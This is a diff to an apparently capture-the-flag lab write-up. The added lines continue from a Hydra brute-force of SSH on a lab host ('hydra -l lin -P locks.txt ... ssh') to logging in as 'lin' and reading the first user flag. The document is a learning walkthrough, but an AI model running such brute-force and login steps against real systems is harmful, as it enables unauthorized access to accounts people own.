@@ -41,9 +41,17 @@ R3dDRaG0Nsynd1c@T3
 ``hydra -l lin -P locks.txt 10.10.229.13 -t 4 ssh``
 
 
-+ **After we execute the brute-force process, Hydra give us the needed password
++ **After we execute the brute-force process, Hydra give us the needed user password**
 
 # ![Alt text](images/hydra_brute.jpg?raw=true "Hydra")
+
++ **With the given credentials, we will connect to the ssh service**
+
+``ssh lin@10.10.229.13``
+
++ **We land on the wanted system so we can read our first user flag**
+
+# ![Alt text](images/first_flag.jpg?raw=true "first_flag")
 
 
 
